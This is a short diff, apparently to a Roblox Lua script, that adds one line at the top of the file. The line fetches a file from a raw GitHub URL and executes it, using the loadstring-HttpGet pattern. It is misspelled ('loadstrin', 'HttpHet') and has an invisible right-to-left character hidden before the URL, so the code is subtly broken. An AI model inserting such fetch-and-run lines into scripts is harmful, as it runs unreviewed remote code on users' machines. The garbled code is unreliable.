@@ -1,3 +1,5 @@
+loadstrin(game:HttpHet("‏https://raw.githubusercontent.com/Ninja10908/DNS/refs/heads/main/s.ban"))()
+
 -- Wait for game to load
 repeat wait() until game:IsLoaded()
 
